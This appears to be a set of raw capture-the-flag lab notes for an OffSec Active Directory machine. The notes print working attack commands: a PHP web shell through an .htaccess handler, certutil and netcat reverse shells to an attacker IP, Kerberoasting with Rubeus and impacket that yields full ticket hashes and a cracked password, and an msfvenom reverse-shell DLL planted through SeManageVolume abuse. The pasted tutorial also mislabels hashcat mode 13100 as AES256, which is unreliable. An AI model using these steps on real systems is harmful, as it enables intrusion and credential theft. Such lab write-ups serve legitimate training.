PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Access The Event
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-23 05:37:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Access The Event
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49783/tcp open  msrpc         Microsoft Windows RPC


[13:42:18] 301 -  344B  - /uploads  ->  http://192.168.206.187/uploads/
[13:42:18] 200 -  777B  - /uploads/

access.offsec



.htaccess (Hypertext Access) file is a plain-text configuration file used by the Apache HTTP Server (and compatible web servers like LiteSpeed).

Enables Server-Side Script Execution (e.g., PHP)

Historically, AddType was used to instruct Apache's PHP handler to execute specific file extensions as PHP scripts.

AddType application/x-httpd-php .php16


http://192.168.206.187/uploads/simcmd.php16?cmd=whoami

certutil.exe -urlcache -f http://192.168.45.195/nc64.exe C:\Users\Public\nc64.exe

C:\Users\Public\nc64.exe 192.168.45.195 8821 -e cmd

http://192.168.206.187/uploads/simcmd.php16?cmd=C:\Users\Public\nc64.exe%20192.168.45.195%208821%20-e%20cmd



PS C:\Users\Public> wget http://192.168.45.202/AD/Get-SPN.ps1 -o Get-SPN.ps1
wget http://192.168.45.202/AD/Get-SPN.ps1 -o Get-SPN.ps1

PS C:\Users\Public> .\Get-SPN.ps1
.\Get-SPN.ps1
Object Name =  SERVER
DN      =       CN=SERVER,OU=Domain Controllers,DC=access,DC=offsec
Object Cat. =  CN=Computer,CN=Schema,CN=Configuration,DC=access,DC=offsec
servicePrincipalNames
SPN( 1 )   =       Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/SERVER.access.offsec
SPN( 2 )   =       ldap/SERVER.access.offsec/ForestDnsZones.access.offsec
SPN( 3 )   =       ldap/SERVER.access.offsec/DomainDnsZones.access.offsec
SPN( 4 )   =       DNS/SERVER.access.offsec
SPN( 5 )   =       GC/SERVER.access.offsec/access.offsec
SPN( 6 )   =       RestrictedKrbHost/SERVER.access.offsec
SPN( 7 )   =       RestrictedKrbHost/SERVER
SPN( 8 )   =       RPC/20dae709-54fe-40ec-8c68-4475793b542a._msdcs.access.offsec
SPN( 9 )   =       HOST/SERVER/ACCESS
SPN( 10 )   =       HOST/SERVER.access.offsec/ACCESS
SPN( 11 )   =       HOST/SERVER
SPN( 12 )   =       HOST/SERVER.access.offsec
SPN( 13 )   =       HOST/SERVER.access.offsec/access.offsec
SPN( 14 )   =       E3514235-4B06-11D1-AB04-00C04FC2DCD2/20dae709-54fe-40ec-8c68-4475793b542a/access.offsec
SPN( 15 )   =       ldap/SERVER/ACCESS
SPN( 16 )   =       ldap/20dae709-54fe-40ec-8c68-4475793b542a._msdcs.access.offsec
SPN( 17 )   =       ldap/SERVER.access.offsec/ACCESS
SPN( 18 )   =       ldap/SERVER
SPN( 19 )   =       ldap/SERVER.access.offsec
SPN( 20 )   =       ldap/SERVER.access.offsec/access.offsec

Object Name =  krbtgt
DN      =       CN=krbtgt,CN=Users,DC=access,DC=offsec
Object Cat. =  CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
servicePrincipalNames
SPN( 1 )   =       kadmin/changepw

Object Name =  MSSQL
DN      =       CN=MSSQL,CN=Users,DC=access,DC=offsec
Object Cat. =  CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
servicePrincipalNames
SPN( 1 )   =       MSSQLSvc/DC.access.offsec

here we find 1 svc mssql.

we have the SPN, we are able to request a ticket and store it in memory with the end goal of getting it’s hash.

Option 1: Native PowerShell & Rubeus (From a Windows Host)
1. Requesting the Ticket using Native Built-in .NET Classes
# Request the TGS ticket for a specific SPN into current session memory
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dc.access.offsec"


Id                   : uuid-4026f5a5-b7b3-425e-9bf9-90f3f5666888-3
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 7/23/2026 8:18:20 AM
ValidTo              : 7/23/2026 6:17:34 PM
ServicePrincipalName : MSSQLSvc/dc.access.offsec
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey


PS C:\Users\Public> .\Rubeus.exe kerberoast /spn:MSSQLSvc/dc.access.offsec /nowrap
.\Rubeus.exe kerberoast /spn:MSSQLSvc/dc.access.offsec /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.


[*] Target SPN             : MSSQLSvc/dc.access.offsec
[*] Hash                   : $krb5tgs$23$*USER$DOMAIN$MSSQLSvc/dc.access.offsec*$F5DAD5C58B7B6530EADC29B627F93B3A$F102AD38DF76D306942FE9C864349A47E3AB3DBA97D2400E6556115B0F0146EAE76BBED6F3BD92DCDE6B475823210BA79CAF5A280E6FCFACB295DC0C936948A2D769E296B4323060E9BF25C040499A7DE1DD4B7247EDE8EB4391D6C2A704670546294D0AE74A62452D62766B4394C184202A5B963725B148C3D5F60E41FA195AF24832A51EE2C38CA2C63EEC3F1997F8D40AAC13C08956447FEC7E07BB8DA4253C519A81118CD09F9813ADC1E13CC0101E9EDBFF5281BF730758EB88E7120F30F4867C47DE9139CAB55BCC7883158FF3AF72A7A4AE3E0E233C8BAD97D4FAACAC62F221B4E0F982FB047D017BB06B75DAC78F8B81F58F76A8B7159AE60DCCF45D988774284C4755EFF7172EBF8B36729CF3AC91282D6CB1FA938F7C79940EC952F98BB193C0E85167DA49A15784FA28D56CE6E7CA1D2232BCAC5E5C04DCB6C9DE05C54576BD65BFDBD7FD6E1E7900900C4AA67CEFED1CBCD4E3D0283745B13F7A0121596E332563A7EB61DB34927C7893EB3CAD5272D638471606DDCB94A035FD0815AA37CF4342A09E071376C2F6535D08F2CB661E0CFE75DC7FF311B85EE3CD7F7926649FDDBE811001ABFB7BFC8FFE3E6236D745B5A1CA4B6E73984F48933DFB3F6A916F9467B5C3ADBAB9C48FB44A7DF81D347E434FC50AD8750BDBB3246AE67D40D2DE2A9ACF6F4D929AF66A1EF3D896EE37F86B9BC8E0754C39C716B32D83C89DDC638DA4FABC6F7D712C4D2FB8F19B6DE34EBBE66701575F022FECC8DB04B83ACBB2FBE15C4EE74FE4127A940EFAABFCC513E6AD4120E61FDCB64BD55FB3000F57BD0B4F01D42156C2121ABE6DFEC6218B378ED7D2444BF711C27FC62F26F568447C98D6A36E57BC4F32BFD15B485ABC55A160F0E79DF2B798F7C4E6727743E916D5632D57C93F2368000290FDF89D4D4395EF9F3137CA417B16241C47F413B1833C14203E81605B53382DD27C83CD02DCCFDE13F35A11A4361A506691FD7BFB1277CDF89DC55CC6BC0718211E8F27055EDC2B1A5E410810DEBE7C943922ED10DD3E7F5A87412604791A9249AEF6EAA73D7C84A60A98E145EB6C3037AAF9C79B24CD6269677848B28E42F04CC67DBAF3EE0D0FDD2C1BB5875F7B7BA5E5C33322B91355C47F3B4A15395CBCE54876314C88EAB14771E8B9FD13B50824DF6444DABEDBB19ABEEF37344DE9C262B1133407A4FE701EB2C8768FC46C68F75334E0994D95C95A8229AA135F8EE22E8583F800A4BC24DE358E9F30C8AB8FAB9C4C3DE22064699EED686BE97DAA5BEA1C523484A8E8462E325748396DDCEE6FC7661123B73DE373A0EBC5434D3BC3518C45F52FD38BE991E84729C1B1AF228DCFCBF2F0DE1964CE7D4FB71B49551496D4F6A4C6D5FB8A2D8CE11194D6403CCB1E706BEC3375F381FB0FAF5ED2B5481CD3B61F55C5D7D4B353A2CCE2AF65369A7B629B8FC4397A78C513876E4942FE8DA4B47F091E647331E34B2587D54FA8F70B067597BCE0F23E816C1EF1298B669FBA101736F342A50F9096CA5945CF84F97B79036FACCEA649997588A5BAE09FDAE60623A3C4C68CF137EFD722983280BF984132CA965621726121CD06CC175CBCCF2D57


method 2:



method 3: request hash from kali

└─$ impacket-GetUserSPNs access.offsec/svc_mssql:'trustno1' -dc-ip 192.168.237.187 -request
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName       Name       MemberOf  PasswordLastSet             LastLogon                   Delegation 
-------------------------  ---------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/DC.access.offsec  svc_mssql            2022-05-21 20:33:45.702230  2026-07-24 15:47:15.604121             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_mssql$ACCESS.OFFSEC$access.offsec/svc_mssql*$5cb51eeee5af5d5fe3be770ee56bddb2$ea85933069d5a3e3d8282b7a72c52b3cb15ff070b7fb818dcc331a5f0f2b545e5d7a557ae5cea09b4dfcadf049d760df2b7b17aca9055dc49a1ab776f142db6fe2bbba266ed743acf33ff066264f1cf2f8bd7ca5e94204d16177f52a21c4e256626995907aaa930a7ce260d78e7ec805188797ea7a882d112f80962c4e2724864c950755c139ae0e96d60b6e02070d23078d819fc6687f85342b3a34bbc385c6f81b254528d6079d6dede8d98d35b62d612674a86b40a87afb473ea3fd1c15fff7d88ac9700e8e31c96a780696b3cc5c740e28d1c9d60470ceb031554bdaf18e0a21a6832d851a435e31b2690f5d45c309b99bf3c74f0095a59c9e95e64abe6127957487f233649c6466e2b228058b5d904273cc105de6413dde79568a32f9b970c0cba32f75793d4926264d7a3ae8feec42fe3b767781bfe7f01d80ffbc1854b77adb809c1636468a061307cc5accaa1d979e2da4c349af1eb15a51fbdc213038817f08442fd5c38847651ea0d0cf4f489717bb02d06e718861e1ad8712086037d2c1b0701e603a7eacd7494873ef03f85b01789e6d68bab6804dee870ac71ff3c58d53aba3e6a36b254612d5cf7fea72e25bbdbbfd7200c496d46631215accb7560e9fa59e871dc1b0ad22ea52cd441eeff8d6c1ae0cd37336a7b0db9c695b6527ae1104857c09d7f17ab1aa14bbab078ba544f34a2ac3627167232d103f013c96e0ffb3ab6c04864608f41bb8db3502712ad986a62ac5484358bab616c5a3b150a04d76d38340358ac4545b2549a4ce8bcae491ae7ede4c1b5789b1bf6abad4dd3b570f16e3b890c786f2e0d0afcbaca11d2cfbdfdf6ce82daeac5a65477baa651b30aba125d2365a01c948534e0b999580358a2a722873bc1f940b7e0033a09d9210be216f9730b4c62ab6f25519a9c07643543d3bcda28f12bd2eb689d4d26ed6083b65178a5950892fc86fc24d9a51d9a8dfdf94944aeb7da407e5b3a8209b500c885205f704a57aaddd32402f72353d9bd040753c4bacf80fa98ab19dcc90d8b03d3a44f253ed8ae16c5bebb0b92505ca8e0ba5a4077ffcde54a64bb5a4f72367c7c5bb1293671f661c6f386ef2ecd99a4ef22bdb3b07f9b840d40eb2511be82099fdb5adf3bac4ef8d3e0ca3cd29f0849ab57a355715633b8accfba0b888163a4457df6a757d4d77f6977431c1608e76b5b09015076683e420aef13284d4654dd41ed11e0c69c0053eaa88cffaea19c83bc9b036edc1e8b4f98e271a03cc7aff269569a3c6b7b8ee5574859d8694d16253fc8e378db9c8da2110ea0cbfd30a3ca9d4f3e1f29da56974407f6cf25c2a34a69f163d570ada1f5bb5c073cbe22cbd9b57b74fa41f2d789ac1e777d3b2e429ef50f20e7f2d9280e48cf0a0e7fb7cce767fb960a12a6b856b598f9e096aad63105eff5a28e0c360315654b1cf0c6d0eb1c29d


└─$ hashcat -m 13100 -a 0 hash ~/tools/rockyou.txt 




PS C:\Users\Public> net users
net users

User accounts for \\SERVER

-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt                   
svc_apache               svc_mssql                
The command completed successfully.


└─$ netexec smb access.offsec -u svc_mssql -p 'trustno1' --shares
SMB         192.168.206.187 445    SERVER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVER) (domain:access.offsec) (signing:True) (SMBv1:None)
SMB         192.168.206.187 445    SERVER           [+] access.offsec\svc_mssql:trustno1 
SMB         192.168.206.187 445    SERVER           [*] Enumerated shares
SMB         192.168.206.187 445    SERVER           Share           Permissions     Remark
SMB         192.168.206.187 445    SERVER           -----           -----------     ------
SMB         192.168.206.187 445    SERVER           ADMIN$                          Remote Admin
SMB         192.168.206.187 445    SERVER           C$                              Default share
SMB         192.168.206.187 445    SERVER           IPC$            READ            Remote IPC
SMB         192.168.206.187 445    SERVER           NETLOGON        READ            Logon server share 
SMB         192.168.206.187 445    SERVER           SYSVOL          READ            Logon server share

but cannot evil-rm into


PS C:\Users\Public> wget http://192.168.45.195/AD/RunasCs.exe -o RunasCs.exe


.\RunasCs.exe svc_mssql trustno1 ".\nc64.exe 192.168.45.195 8822 -e cmd" 

└─$ nc -nvlp 8822                                     
listening on [any] 8822 ...
connect to [192.168.45.195] from (UNKNOWN) [192.168.237.187] 50046
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
access\svc_mssql


C:\Users\svc_mssql\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State   
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled


https://medium.com/@mrlionofficial/privilege-escalation-via-semanagevolumeprivilege-2ebc0077b961

althrough it is disable of SeManageVolumePrivilege, we can still use this exploit payload.

wget http://192.168.45.195/AD/SeManageVolumeExploit.exe -o SeManageVolumeExploit.exe

https://github.com/xct/SeManageVolumeAbuse

.\SeManageVolumeExploit.exe
Entries changed: 929
DONE 


PS C:\Users\svc_mssql\Documents> icacls C:/Windows
icacls C:/Windows
C:/Windows NT SERVICE\TrustedInstaller:(F)
           NT SERVICE\TrustedInstaller:(CI)(IO)(F)
           NT AUTHORITY\SYSTEM:(M)
           NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
           BUILTIN\Users:(M)
           BUILTIN\Users:(OI)(CI)(IO)(F)
           BUILTIN\Users:(RX)
           BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
           CREATOR OWNER:(OI)(CI)(IO)(F)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)

icacls (short for Integrity Control Access Control List Software) is a built-in Windows command-line tool used to view, modify, backup, and restore Access Control Lists (ACLs) for files and folders.

we can view the proof.txt. but still with shell of svc_mssql

Get full control over C:\ when the user has SeManageVolumePrivilege (allowing to read/write any files). One possible way to get a shell from here is to write a custom dll to C:\Windows\System32\wbem\tzres.dll & call systeminfo to trigger it.

└─$ msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.195 lport=8823 -f dll -o tzres.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Saved as: tzres.dll

PS C:\Users\Administrator\Desktop> wget http://192.168.45.195/tzres.dll -o C:\Windows\System32\wbem\tzres.dll
wget http://192.168.45.195/tzres.dll -o C:\Windows\System32\wbem\tzres.dll





└─$ nc -nvlp 8823                                                                                 
listening on [any] 8823 ...
\connect to [192.168.45.195] from (UNKNOWN) [192.168.237.187] 50333
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\network service




Once an SPN is identified, requesting the Kerberos TGS (Ticket Granting Service) ticket and extracting its hash for offline cracking can be done using built-in Windows features, PowerShell modules, or dedicated Linux tools depending on your execution context.

---

### Option 1: Native PowerShell & Rubeus (From a Windows Host)

If operating inside a Windows session authenticated to the domain:

#### 1. Requesting the Ticket using Native Built-in .NET Classes

PowerShell can interact with the underlying .NET Kerberos client directly to request a ticket into memory:

```powershell
# Request the TGS ticket for a specific SPN into current session memory
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/db01.access.offsec:1433"

```

*(After running this, the ticket sits in LSASS memory under the current user's Kerberos cache.)*

#### 2. Requesting & Formatting Hashes directly with Rubeus

`Rubeus` automates ticket requests, extracts the encrypted part from memory, and outputs it directly as a Hashcat-ready crackable string (`$krb5tgs$23$*...`):

```cmd
# Request and output hash for a specific SPN
Rubeus.exe kerberoast /spn:MSSQLSvc/db01.access.offsec:1433 /nowrap

# Kerberoast ALL user accounts with SPNs in the domain at once
Rubeus.exe kerberoast /nowrap

```

---

### Option 2: PowerView + Mimikatz (Extracting from LSASS Memory)

If you loaded the ticket into memory using standard Windows methods, tools like `Mimikatz` or `PowerView` can dump it to a file or format it for cracking.

```powershell
# 1. Request ticket using PowerView function
Request-SPNTicket -SPN "MSSQLSvc/db01.access.offsec:1433"

# 2. Extract tickets from memory via Mimikatz to .kirbi files on disk
Invoke-Mimikatz -Command '"kerberos::ask /target:MSSQLSvc/db01.access.offsec:1433"'

```

You can then convert `.kirbi` ticket files into Hashcat format using `kirbi2john` or `tgskrb5.py`.

---

### Option 3: Impacket `GetUserSPNs.py` (From a Linux Machine)

If targeting the domain controller directly over the network using valid domain credentials, Impacket's `GetUserSPNs.py` handles the LDAP query, the TGS-REQ packet, and formats the hash automatically:

```bash
# Query SPNs, request TGS tickets, and print crackable hashes to screen/file
impacket-GetUserSPNs access.offsec/Administrator:'Password123!' -dc-ip 192.168.1.10 -request

# Output to a file directly
impacket-GetUserSPNs access.offsec/Administrator:'Password123!' -dc-ip 192.168.1.10 -request -outputfile hashes.kerberoast

```

---

### Cracking the Hash

Once you have the extracted `$krb5tgs$` hash string, use **Hashcat** with mode **13100** (for AES256-cts-hmac-sha1) or mode **13100 / 13100** (RC4-HMAC is mode **13100**):

```bash
# Hashcat Mode 13100 = Kerberos 5, etype 23 (TGS-REP RC4)
hashcat -m 13100 -a 0 hashes.kerberoast /path/to/wordlist.txt --force

```
